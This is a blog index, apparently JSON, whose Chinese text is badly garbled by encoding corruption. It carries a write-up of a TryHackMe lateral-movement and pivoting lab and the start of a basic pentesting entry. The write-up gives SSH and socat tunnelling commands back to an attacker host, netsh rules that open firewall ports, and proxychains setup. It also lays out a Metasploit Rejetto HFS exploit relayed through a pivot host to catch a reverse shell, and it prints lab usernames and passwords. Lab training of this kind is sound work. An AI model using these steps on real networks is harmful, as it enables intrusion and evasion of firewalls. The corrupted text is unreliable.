æ³•è¿æ¥å›æˆ‘ä»¬çš„ä¸»æœºä¸Šè¿è¡Œåå‘ shellï¼Œæˆ–è€…ä»…ä»…æ˜¯ä½¿æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•æœåŠ¡å¯¹äºæ²¡æœ‰ç›´æ¥è¿æ¥åˆ°æˆ‘ä»¬çš„æœºå™¨çš„æœºå™¨å¯ç”¨ã€‚ è¦ä»æ”»å‡»è€…çš„è®¡ç®—æœºè½¬å‘ç«¯å£ 80 å¹¶ä½¿å…¶å¯ä» PC-1 è®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ PC-1 ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N è¯¥å‘½ä»¤ç»“æ„ä¸è¿œç¨‹ç«¯å£è½¬å‘ä¸­ä½¿ç”¨çš„å‘½ä»¤ç»“æ„ç±»ä¼¼ï¼Œä½†ä½¿ç”¨ -L é€‰é¡¹è¿›è¡Œæœ¬åœ°ç«¯å£è½¬å‘ã€‚æ­¤é€‰é¡¹è¦æ±‚æˆ‘ä»¬æŒ‡ç¤º PC-1 ç”¨äºæ¥æ”¶è¿æ¥çš„æœ¬åœ°å¥—æ¥å­— ( *:80 ) ä»¥åŠä»æ”»å‡»è€…çš„ PC è§’åº¦è¿æ¥çš„è¿œç¨‹å¥—æ¥å­— ( 127.0.0.1:80 )ã€‚ è¯·æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨ç¬¬äºŒä¸ªå¥—æ¥å­—ä¸­ä½¿ç”¨ IP åœ°å€ 127.0.0.1ï¼Œä»æ”»å‡»è€…çš„ PC è§’åº¦æ¥çœ‹ï¼Œè¿™æ˜¯æŒæœ‰è¦è½¬å‘çš„ç«¯å£ 80 çš„ä¸»æœºã€‚ ç”±äºæˆ‘ä»¬åœ¨ PC-1 ä¸Šæ‰“å¼€ä¸€ä¸ªæ–°ç«¯å£ï¼Œå› æ­¤æˆ‘ä»¬å¯èƒ½éœ€è¦æ·»åŠ é˜²ç«å¢™è§„åˆ™ä»¥å…è®¸ä¼ å…¥è¿æ¥ï¼ˆä½¿ç”¨ dir=in ï¼‰ã€‚ä¸ºæ­¤éœ€è¦ç®¡ç†æƒé™ï¼š netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 è®¾ç½®éš§é“åï¼Œä»»ä½•å°†æµè§ˆå™¨æŒ‡å‘ http://2.2.2.2:80 çš„ PC-1 çš„ç”¨æˆ·éƒ½ä¼šçœ‹åˆ°æ”»å‡»è€…è®¡ç®—æœºå‘å¸ƒçš„ç½‘ç«™ã€‚ ä½¿ç”¨ socat è¿›è¡Œç«¯å£è½¬å‘ åœ¨ SSH ä¸å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œsocat å¯ç”¨äºæ‰§è¡Œç±»ä¼¼çš„åŠŸèƒ½ã€‚è™½ç„¶ä¸å¦‚ SSH çµæ´»ï¼Œä½† socat å…è®¸æ‚¨ä»¥æ›´ç®€å•çš„æ–¹å¼è½¬å‘ç«¯å£ã€‚ä½¿ç”¨ socat çš„ç¼ºç‚¹ä¹‹ä¸€æ˜¯æˆ‘ä»¬éœ€è¦å°†å…¶ä¼ è¾“åˆ°æ¢è½´ä¸»æœºï¼ˆåœ¨æˆ‘ä»¬å½“å‰çš„ç¤ºä¾‹ä¸­ä¸º PC-1ï¼‰ï¼Œä½¿å…¶æ¯” SSH æ›´å®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œä½†åœ¨æ²¡æœ‰å…¶ä»–é€‰é¡¹å¯ç”¨çš„æƒ…å†µä¸‹å¯èƒ½å€¼å¾—ä¸€è¯•ã€‚ ä½¿ç”¨ socat æ‰§è¡Œç«¯å£è½¬å‘çš„åŸºæœ¬è¯­æ³•è¦ç®€å•å¾—å¤šã€‚å¦‚æœæˆ‘ä»¬æƒ³æ‰“å¼€ä¸»æœºä¸Šçš„ç«¯å£ 1234 å¹¶å°†æˆ‘ä»¬æ”¶åˆ°çš„ä»»ä½•è¿æ¥è½¬å‘åˆ°ä¸»æœº 1.1.1.1 ä¸Šçš„ç«¯å£ 4321ï¼Œæ‚¨å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321 fork é€‰é¡¹å…è®¸ socat ä¸ºæ”¶åˆ°çš„æ¯ä¸ªè¿æ¥åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œä»è€Œå¯ä»¥åœ¨ä¸å…³é—­çš„æƒ…å†µä¸‹å¤„ç†å¤šä¸ªè¿æ¥ã€‚å¦‚æœä¸åŒ…å«å®ƒï¼Œsocat å°†åœ¨ç¬¬ä¸€ä¸ªè¿æ¥å®Œæˆæ—¶å…³é—­ã€‚ å›åˆ°æˆ‘ä»¬çš„ç¤ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åƒä½¿ç”¨ SSH è¿œç¨‹ç«¯å£è½¬å‘ä¸€æ ·ä½¿ç”¨ PC-1 ä½œä¸ºæ¢çº½æ¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„ç«¯å£ 3389ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 è¯·æ³¨æ„ï¼Œsocat æ— æ³•åƒ SSH é‚£æ ·å°†è¿æ¥ç›´æ¥è½¬å‘åˆ°æ”»å‡»è€…çš„è®¡ç®—æœºï¼Œä½†ä¼šåœ¨ PC-1 ä¸Šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…çš„è®¡ç®—æœºéšåå¯ä»¥è¿æ¥åˆ°è¯¥ç«¯å£ï¼š åƒå¾€å¸¸ä¸€æ ·ï¼Œç”±äºåœ¨æ¢è½´ä¸»æœºä¸Šæ‰“å¼€äº†ä¸€ä¸ªç«¯å£ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªé˜²ç«å¢™è§„åˆ™ä»¥å…è®¸åˆ°è¯¥ç«¯å£çš„ä»»ä½•è¿æ¥ï¼š netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæˆ‘ä»¬æƒ³ä»æ”»å‡»è€…çš„æœºå™¨å…¬å¼€ç«¯å£ 80ï¼Œä»¥ä¾¿æœåŠ¡å™¨å¯ä»¥è®¿é—®å®ƒï¼Œæˆ‘ä»¬åªéœ€è¦ç¨å¾®è°ƒæ•´ä¸€ä¸‹å‘½ä»¤ï¼š C:\\&gt;socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 ç»“æœï¼ŒPC-1 å°†ç”Ÿæˆç«¯å£ 80 å¹¶ä¾¦å¬è¦è½¬å‘åˆ°æ”»å‡»è€…è®¡ç®—æœºä¸Šçš„ç«¯å£ 80 çš„è¿æ¥ï¼š åŠ¨æ€ç«¯å£è½¬å‘å’Œ SOCKS è™½ç„¶å•ç«¯å£è½¬å‘å¯¹äºéœ€è¦è®¿é—®ç‰¹å®šå¥—æ¥å­—çš„ä»»åŠ¡éå¸¸æœ‰æ•ˆï¼Œä½†æœ‰æ—¶æˆ‘ä»¬å¯èƒ½éœ€è¦é€šè¿‡æ¢è½´ä¸»æœºå¯¹ä¸»æœºçš„è®¸å¤šç«¯å£ç”šè‡³è·¨å¤šå°è®¡ç®—æœºçš„è®¸å¤šç«¯å£è¿è¡Œæ‰«æã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼ŒåŠ¨æ€ç«¯å£è½¬å‘å…è®¸æˆ‘ä»¬é€šè¿‡ä¸»æœºè¿›è¡Œæ—‹è½¬ï¼Œå¹¶ä½¿ç”¨ SOCKS ä»£ç†ä¸æˆ‘ä»¬æƒ³è¦çš„ä»»ä½• IP åœ°å€/ç«¯å£å»ºç«‹å¤šä¸ªè¿æ¥ã€‚ ç”±äºæˆ‘ä»¬ä¸æƒ³ä¾èµ–ç›®æ ‡ç½‘ç»œä¸­ Windows è®¡ç®—æœºä¸Šç°æœ‰çš„ SSH æœåŠ¡å™¨ï¼Œå› æ­¤æˆ‘ä»¬é€šå¸¸ä¼šä½¿ç”¨ SSH å®¢æˆ·ç«¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤å»ºç«‹åå‘åŠ¨æ€ç«¯å£è½¬å‘ï¼š C:\\&gt; ssh tunneluser@1.1.1.1 -R 9050 -N åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒSSH æœåŠ¡å™¨å°†åœ¨ç«¯å£ 9050 ä¸Šå¯åŠ¨ SOCKS ä»£ç†ï¼Œå¹¶é€šè¿‡ SSH éš§é“è½¬å‘ä»»ä½•è¿æ¥è¯·æ±‚ï¼Œæœ€ç»ˆç”± SSH å®¢æˆ·ç«¯ä»£ç†ã€‚ æœ€æœ‰è¶£çš„éƒ¨åˆ†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»£ç†é“¾é€šè¿‡ SOCKS ä»£ç†è½»æ¾ä½¿ç”¨æˆ‘ä»¬çš„ä»»ä½•å·¥å…·ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç¡®ä¿ proxychains æ­£ç¡®é…ç½®ä¸ºå°†ä»»ä½•è¿æ¥æŒ‡å‘ SOCKS ä»£ç†æœåŠ¡å™¨çš„ SSH ä½¿ç”¨çš„åŒä¸€ç«¯å£ã€‚ proxychains é…ç½®æ–‡ä»¶å¯ä»¥åœ¨ AttackBox ä¸Šçš„ /etc/proxychains.conf å¤„æ‰¾åˆ°ã€‚å¦‚æœæˆ‘ä»¬å‘ä¸‹æ»šåŠ¨åˆ°é…ç½®æ–‡ä»¶çš„æœ«å°¾ï¼Œæˆ‘ä»¬åº”è¯¥çœ‹åˆ°ä¸€è¡ŒæŒ‡ç¤ºç”¨äºè¢œå­ä»£ç†çš„ç«¯å£ï¼š [ProxyList] socks4 127.0.0.1 9050 é»˜è®¤ç«¯å£æ˜¯ 9050ï¼Œä½†æ˜¯åªè¦ä¸æˆ‘ä»¬å»ºç«‹ SSH éš§é“æ—¶ä½¿ç”¨çš„ç«¯å£åŒ¹é…ï¼Œä»»ä½•ç«¯å£éƒ½å¯ä»¥å·¥ä½œã€‚ å¦‚æœæˆ‘ä»¬ç°åœ¨æƒ³é€šè¿‡ä»£ç†æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»£ç†é“¾ï¼š proxychains curl http://pxeboot.za.tryhackme.com è¯·æ³¨æ„ï¼ŒæŸäº›è½¯ä»¶ï¼ˆä¾‹å¦‚ nmapï¼‰åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½æ— æ³•ä¸ SOCKS å¾ˆå¥½åœ°é…åˆï¼Œå¹¶ä¸”å¯èƒ½æ˜¾ç¤ºä¸åŒçš„ç»“æœï¼Œå› æ­¤æ‚¨çš„æƒ…å†µå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒã€‚ å®è·µç»ƒä¹  æ³¨æ„ï¼šç”±äºæ‚¨å°†ä½¿ç”¨ tunneluser æ‰§è¡Œä»å®éªŒå®¤ç½‘ç»œåˆ°æ”»å‡»è€…è®¡ç®—æœºçš„ SSH è¿æ¥ï¼Œå› æ­¤æˆ‘ä»¬å¼ºçƒˆå»ºè®®æ‚¨ä½¿ç”¨ Attackbox æˆ–è™šæ‹Ÿæœºï¼Œè€Œä¸æ˜¯æ‚¨çš„å®é™…è®¡ç®—æœºã€‚å·²ç»™å‡ºæœ‰å…³åˆ›å»ºä¸å…è®¸é€šè¿‡ SSH/SCP è¿è¡Œå‘½ä»¤æˆ–ä¼ è¾“æ–‡ä»¶çš„ç”¨æˆ·çš„è¯´æ˜ï¼Œå› æ­¤è¯·åŠ¡å¿…æŒ‰ç…§æä¾›çš„è¯´æ˜è¿›è¡Œæ“ä½œã€‚è¿˜å»ºè®®ä¸º tunneluser åˆ›å»ºä¸€ä¸ªå¼ºå¯†ç ï¼Œå¹¶ç¡®ä¿å®ƒæ˜¯å”¯ä¸€ä¸”å¯ä¸¢å¼ƒçš„å¯†ç ï¼Œè€Œä¸æ˜¯æ‚¨åœ¨æ­¤æˆ–ä»»ä½•å…¶ä»–å¹³å°ä¸­çš„å®é™…å¯†ç ã€‚ è¦å®Œæˆæ­¤ç»ƒä¹ ï¼Œæ‚¨éœ€è¦ä½¿ç”¨åœ¨ä»»åŠ¡ 1 ä¸­ä» http://distributor.za.tryhackme.com/creds åˆ†é…ç»™æ‚¨çš„å‡­æ®è¿æ¥åˆ° THMJMP2ã€‚å¦‚æœæ‚¨è¿˜æ²¡æœ‰è¿™æ ·åšï¼Œè¯·å•å‡»é“¾æ¥å¹¶ç«‹å³è·å–å‡­æ®ã€‚è·å¾—å‡­æ®åï¼Œé€šè¿‡ SSH è¿æ¥åˆ° THMJMP2ï¼š ssh za\\\\tony.holland@thmjmp2.za.tryhackme.com //å¯†ç ä¸ºï¼šMhvn2334 æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç›®æ ‡æ˜¯é€šè¿‡ RDP è¿æ¥åˆ° THMIISã€‚å¦‚æœæˆ‘ä»¬å°è¯•ç›´æ¥ä»æ”»å‡»è€…è®¡ç®—æœºè¿›è¡Œè¿æ¥ï¼Œæˆ‘ä»¬ä¼šå‘ç°ç«¯å£ 3389 å·²é€šè¿‡é˜²ç«å¢™è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•ç›´æ¥ä½¿ç”¨ã€‚ä½†æ˜¯ï¼Œè¯¥ç«¯å£å·²å¯åŠ¨å¹¶æ­£åœ¨è¿è¡Œï¼Œä½†åªèƒ½ä» THMJMP2 è®¿é—®ã€‚é€šè¿‡ä½¿ç”¨ THMJMP2 ä¸Š C:\\tools\\socat\\ ä¸Šæä¾›çš„ socatï¼Œæˆ‘ä»¬å°†è½¬å‘ RDP ç«¯å£ï¼Œä½¿å…¶åœ¨ THMJMP2 ä¸Šå¯ç”¨äºä»æ”»å‡»è€…çš„è®¡ç®—æœºè¿›è¡Œè¿æ¥ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‚æ•°è¿è¡Œ socatï¼š C:\\tools\\socat\\&gt;socat TCP4-LISTEN:3697,fork TCP4:THMIIS.za.tryhackme.com:3389 è¯·æ³¨æ„ï¼Œæˆ‘ä»¬ä¸èƒ½å°†ç«¯å£ 3389 ç”¨äºä¾¦å¬å™¨ï¼Œå› ä¸ºå®ƒå·²åœ¨ THMJMP2 ä¸­ç”¨äºå…¶è‡ªå·±çš„ RDP æœåŠ¡ã€‚è¯·éšæ„å°†ä¾¦å¬å™¨ç«¯å£ (13389) æ›´æ”¹ä¸ºå…¶ä»–å·ç ï¼Œä»¥é¿å…ä¸å…¶ä»–å­¦ç”Ÿå‘ç”Ÿå†²çªã€‚åœ¨å…¸å‹è®¾ç½®ä¸­ï¼Œæ‚¨å¿…é¡»æ·»åŠ é˜²ç«å¢™è§„åˆ™ä»¥å…è®¸æµé‡é€šè¿‡ä¾¦å¬å™¨ç«¯å£ï¼Œä½†ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼ŒTHMJMP2 å·²ç¦ç”¨å…¶é˜²ç«å¢™ã€‚ è®¾ç½®ä¾¦å¬å™¨åï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿé€šè¿‡ THMJMP2 å¤„çš„ socat ä¾¦å¬å™¨é€šè¿‡ RDP ä»æ”»å‡»è€…è®¡ç®—æœºè¿æ¥åˆ° THMIISï¼š user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:3697 /u:t1_thomas.moore /p:MyPazzw3rd2020 è¿æ¥åï¼Œæ‚¨åº”è¯¥ä¼šä» THMIIS ä¸Šçš„ t1_thomas.moore æ¡Œé¢ä¸Šè·å¾—ä¸€ä¸ªæ ‡å¿—ã€‚ éš§é“å¤æ‚æ¼æ´ THMDC æœåŠ¡å™¨æ­£åœ¨è¿è¡Œ Rejetto HFS çš„æ˜“å—æ”»å‡»ç‰ˆæœ¬ã€‚æˆ‘ä»¬é¢ä¸´çš„é—®é¢˜æ˜¯é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹æ˜“å—æ”»å‡»çš„ç«¯å£çš„è®¿é—®ï¼Œå› æ­¤åªèƒ½ä» THMJMP2 è¿›è¡ŒæŸ¥çœ‹ã€‚æ­¤å¤–ï¼Œæ¥è‡ª THMDC çš„å‡ºç«™è¿æ¥ä»…å…è®¸å…¶æœ¬åœ°ç½‘ç»œä¸­çš„è®¡ç®—æœºè¿›è¡Œï¼Œå› æ­¤æ— æ³•ç›´æ¥æ¥æ”¶åˆ°æ”»å‡»è€…è®¡ç®—æœºçš„åå‘ shellã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼ŒRejetto HFS æ¼æ´è¦æ±‚æ”»å‡»è€…æ‰˜ç®¡ HTTP æœåŠ¡å™¨æ¥è§¦å‘æœ€ç»ˆæœ‰æ•ˆè´Ÿè½½ï¼Œä½†ç”±äºæ”»å‡»è€…çš„è®¡ç®—æœºä¸å…è®¸å‡ºç«™è¿æ¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥æ‰˜ç®¡ Web æœåŠ¡å™¨ä¹‹ä¸€åŒä¸€ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨ï¼Œè¿™ä¸€ç‚¹ä¹Ÿä¸æ–¹ä¾¿ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç«¯å£è½¬å‘æ¥å…‹æœæ‰€æœ‰è¿™äº›é—®é¢˜ã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹çœ‹è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚é¦–å…ˆï¼Œå®ƒå°†è¿æ¥åˆ° HFS ç«¯å£ï¼ˆMetasploit ä¸­çš„ RPORT ï¼‰ä»¥è§¦å‘ç¬¬äºŒä¸ªè¿æ¥ã€‚ç¬¬äºŒä¸ªè¿æ¥å°†åœ¨ SRVPORT ä¸Šé’ˆå¯¹æ”»å‡»è€…çš„è®¡ç®—æœºè¿›è¡Œï¼Œå…¶ä¸­ Web æœåŠ¡å™¨å°†ä¼ é€’æœ€ç»ˆçš„æœ‰æ•ˆè´Ÿè½½ã€‚æœ€åï¼Œæ”»å‡»è€…çš„æœ‰æ•ˆè´Ÿè½½å°†åœ¨ LPORT ä¸Šæ‰§è¡Œå¹¶å‘æ”»å‡»è€…å‘é€å›åå‘ shellï¼š è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SSH å°†æŸäº›ç«¯å£ä»æ”»å‡»è€…çš„è®¡ç®—æœºè½¬å‘åˆ° THMJMP2ï¼ˆç”¨äº Web æœåŠ¡å™¨çš„ SRVPORT å’Œç”¨äºæ¥æ”¶åå‘ shell çš„ LPORTï¼‰ï¼Œå¹¶é€šè¿‡ THMJMP2 åˆ°è¾¾ THMDC ä¸Šçš„ RPORTã€‚æˆ‘ä»¬éœ€è¦åœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šè¿›è¡Œä¸‰ä¸ªç«¯å£è½¬å‘ï¼Œä»¥ä¾¿æ‰€æœ‰æ¼æ´åˆ©ç”¨çš„äº¤äº’éƒ½å¯ä»¥é€šè¿‡ THMJMP2 è¿›è¡Œä»£ç†ï¼š Rejetto HFS å°†ä¾¦å¬ THMDC ä¸Šçš„ç«¯å£ 80ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨è¿œç¨‹ç«¯å£è½¬å‘é€šè¿‡ THMJMP2 å°†è¯¥ç«¯å£éš§é“ä¼ å›æ”»å‡»è€…çš„è®¡ç®—æœºã€‚ç”±äºæ”»å‡»ç›’çš„ 80 ç«¯å£å·²è¢«å…¶ä»–æœåŠ¡å ç”¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°† THMDC ä¸Šçš„ç«¯å£ 80 ä¸æ”»å‡»ç›’å½“å‰æœªä½¿ç”¨çš„æŸä¸ªç«¯å£é“¾æ¥èµ·æ¥ã€‚è®©æˆ‘ä»¬ä½¿ç”¨ç«¯å£ 8888ã€‚åœ¨ THMJMP2 ä¸­è¿è¡Œ ssh æ¥è½¬å‘æ­¤ç«¯å£æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»å°† -R 8888:thmdc.za.tryhackme.com:80 æ·»åŠ åˆ°æˆ‘ä»¬çš„å‘½ä»¤ä¸­ã€‚ å¯¹äºSRVPORTå’ŒLPORTï¼Œæˆ‘ä»¬éšæ„é€‰æ‹©ä¸¤ä¸ªéšæœºç«¯å£ã€‚å‡ºäºæ¼”ç¤ºç›®çš„ï¼Œæˆ‘ä»¬å°†è®¾ç½® SRVPORT=6666 å’Œ LPORT=7878 ï¼Œä½†è¯·åŠ¡å¿…ä½¿ç”¨ä¸åŒçš„ç«¯å£ï¼Œå› ä¸ºå®éªŒå®¤ä¸å…¶ä»–å­¦ç”Ÿå…±äº«ï¼Œå› æ­¤å¦‚æœä½ ä»¬ä¸¤ä¸ªé€‰æ‹©ç›¸åŒçš„ç«¯å£ï¼Œå½“å°è¯•è½¬å‘å®ƒä»¬æ—¶ï¼Œæ‚¨ä¼šæ”¶åˆ°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼ŒæŒ‡å‡ºæ­¤ç±»ç«¯å£å·²åœ¨ THMJMP2 ä¸Šä½¿ç”¨ã€‚ è¦å°†æ­¤ç±»ç«¯å£ä»æ”»å‡»è€…è®¡ç®—æœºè½¬å‘åˆ° THMJMP2ï¼Œæˆ‘ä»¬å°†é€šè¿‡åœ¨ ssh å‘½ä»¤ä¸­æ·»åŠ  -L *:6666:127.0.0.1:6666 å’Œ -L *:7878:127.0.0.1:7878 æ¥ä½¿ç”¨æœ¬åœ°ç«¯å£è½¬å‘ã€‚è¿™å°†ç»‘å®š THMJMP2 ä¸Šçš„ä¸¤ä¸ªç«¯å£ï¼Œå¹¶å°†ä»»ä½•è¿æ¥éš§é“è¿”å›åˆ°æˆ‘ä»¬çš„æ”»å‡»è€…è®¡ç®—æœºã€‚ å°†æ•´ä¸ªå‘½ä»¤æ”¾åœ¨ä¸€èµ·ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š C:\\&gt; ssh tunneluser@10.50.46.236 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N æ³¨æ„ï¼šå¦‚æœæ‚¨ä½¿ç”¨ AttackBox å¹¶ä¸”ä¹‹å‰åŠ å…¥è¿‡å…¶ä»–ç½‘ç»œæˆ¿é—´ï¼Œè¯·åŠ¡å¿…é€‰æ‹©åˆ†é…ç»™é¢å‘ lateralmovementandpivoting ç½‘ç»œçš„éš§é“æ¥å£çš„ IP åœ°å€ä½œä¸ºæ‚¨çš„ ATTACKER_IPï¼Œå¦åˆ™æ‚¨çš„åå‘ shell/è¿æ¥å°†è·èƒœæ— æ³•æ­£å¸¸å·¥ä½œã€‚ä¸ºäº†æ‚¨çš„æ–¹ä¾¿ï¼Œè¿æ¥åˆ°è¯¥ç½‘ç»œçš„æ¥å£ç§°ä¸º lateralmovement ï¼Œå› æ­¤æ‚¨åº”è¯¥èƒ½å¤Ÿé€šè¿‡è¿è¡Œ ip add show lateralmovement è·å¾—æ­£ç¡®çš„ IP åœ°å€ï¼š ä¸€æ—¦æ‰€æœ‰ç«¯å£è½¬å‘åˆ°ä½ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯åŠ¨ Metasploit å¹¶é…ç½®æ¼æ´åˆ©ç”¨ç¨‹åºï¼Œä»¥ä¾¿æ‰€éœ€çš„ç«¯å£ä¸æˆ‘ä»¬é€šè¿‡ THMJMP2 è½¬å‘çš„ç«¯å£ç›¸åŒ¹é…ï¼š è¿™é‡Œæœ‰å¾ˆå¤šä¸œè¥¿éœ€è¦è§£å‹ï¼š LHOSTå‚æ•°é€šå¸¸æœ‰ä¸¤ä¸ªç”¨é€”ï¼šä½œä¸ºæ”»å‡»è€…æœºå™¨ä¸Šç»‘å®šç›‘å¬å™¨çš„IPï¼Œç”¨äºæ¥æ”¶åå‘shellï¼›å®ƒè¿˜åµŒå…¥åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­ï¼Œä»¥ä¾¿å—å®³è€…çŸ¥é“åœ¨è§¦å‘æ¼æ´æ—¶ä»å“ªé‡Œè¿›è¡Œè¿æ¥ã€‚åœ¨æˆ‘ä»¬çš„ç‰¹å®šåœºæ™¯ä¸­ï¼Œç”±äº THMDC æ— æ³•è”ç³»åˆ°æˆ‘ä»¬ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¼ºåˆ¶æœ‰æ•ˆè´Ÿè½½è¿æ¥å› THMJMP2ï¼Œä½†æˆ‘ä»¬éœ€è¦ä¾¦å¬å™¨åœ¨ 127.0.0.1 ä¸Šç»‘å®šåˆ°æ”»å‡»è€…çš„è®¡ç®—æœºã€‚ä¸ºæ­¤ï¼ŒMetasploit æä¾›äº†ä¸€ä¸ªå¯é€‰å‚æ•° ReverseListenerBindAddress ï¼Œè¯¥å‚æ•°å¯ç”¨äºæŒ‡å®šæ”»å‡»è€…æœºå™¨ä¸Šä¾¦å¬å™¨çš„ç»‘å®šåœ°å€ï¼Œä¸è´Ÿè½½å°†è¿æ¥å›çš„åœ°å€åˆ†å¼€ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å°†åå‘ shell ä¾¦å¬å™¨ç»‘å®šåˆ°æ”»å‡»è€…è®¡ç®—æœºä¸Šçš„ 127.0.0.1ï¼Œå¹¶å°†æœ‰æ•ˆè´Ÿè½½è¿æ¥å› THMJMP2ï¼ˆå› ä¸ºå®ƒå°†é€šè¿‡ SSH éš§é“è½¬å‘åˆ°æ”»å‡»è€…è®¡ç®—æœºï¼‰ã€‚ æˆ‘ä»¬çš„æ¼æ´è¿˜å¿…é¡»è¿è¡Œä¸€ä¸ª Web æœåŠ¡å™¨æ¥æ‰˜ç®¡å¹¶å°†æœ€ç»ˆæœ‰æ•ˆè´Ÿè½½å‘é€å›å—å®³è€…æœåŠ¡å™¨ã€‚æˆ‘ä»¬ä½¿ç”¨ SRVHOST æ¥æŒ‡ç¤ºç›‘å¬åœ°å€ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º 127.0.0.1ï¼Œä»¥ä¾¿æ”»å‡»è€…æœºå™¨å°† Web æœåŠ¡å™¨ç»‘å®šåˆ° localhostã€‚è™½ç„¶è¿™å¯èƒ½è¿åç›´è§‰ï¼Œå› ä¸ºæ²¡æœ‰å¤–éƒ¨ä¸»æœºèƒ½å¤ŸæŒ‡å‘æ”»å‡»è€…çš„è®¡ç®—æœºæœ¬åœ°ä¸»æœºï¼Œä½† SSH éš§é“å°†è´Ÿè´£å°† SRVPORT å¤„ THMJMP2 ä¸Šæ”¶åˆ°çš„ä»»ä½•è¿æ¥è½¬å‘å›æ”»å‡»è€…çš„è®¡ç®—æœºã€‚ RHOSTS è®¾ç½®ä¸ºæŒ‡å‘ 127.0.0.1ï¼Œå› ä¸º SSH éš§é“å°†é€šè¿‡ä½¿ç”¨ THMJMP2 å»ºç«‹çš„ SSH éš§é“å°†è¯·æ±‚è½¬å‘åˆ° THMDCã€‚ RPORT è®¾ç½®ä¸º 8888ï¼Œå› ä¸ºå‘é€åˆ°æ”»å‡»è€…è®¡ç®—æœºä¸Šè¯¥ç«¯å£çš„ä»»ä½•è¿æ¥éƒ½å°†è½¬å‘åˆ° THMDC ä¸Šçš„ç«¯å£ 80ã€‚ å¯åŠ¨è¯¥æ¼æ´åï¼Œæ‚¨å°†åœ¨æ”»å‡»è€…çš„è®¡ç®—æœºä¸Šæ”¶åˆ°ä¸€ä¸ª shellã€‚æ‚¨ä¼šåœ¨ C:\\hfs\\flag.txt ä¸Šæ‰¾åˆ°ä¸€ä¸ªæ ‡å¿—ã€‚ 0x08 å‚è€ƒæ–‡ç«  TryHackMe | Lateral Movement &amp; Pivoting","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Basic Pentesting","path":"/2024/02/14/thm-basic-pentesting/","content":"0x01 ç®€ä»‹ åœ¨è¿™ç»„ä»»åŠ¡ä¸­ï¼Œæ‚¨å°†å­¦åˆ°ä»¥ä¸‹å†…å®¹ï¼š brute forcing æš´åŠ›ç ´è§£ hash cracking å“ˆå¸Œç ´è§£ service enumeration æœåŠ¡æšä¸¾ Linux Enumeration Linuxæšä¸¾ è¿™é‡Œçš„ä¸»è¦ç›®æ ‡æ˜¯å°½å¯èƒ½å¤šåœ°å­¦ä¹ ã€‚ç¡®ä¿æ‚¨ä½¿ç”¨ OpenVPN é…ç½®æ–‡ä»¶è¿æ¥åˆ°æˆ‘ä»¬çš„ç½‘ç»œã€‚ æ„Ÿè°¢æ¥è‡ª Vulnhub çš„ Josiah Pierceã€‚ 0x02 nmapæ‰«æ nmap -Pn -A -v ip 0x03 ç›®å½•æ‰«æ dirsearch -u \"url\" 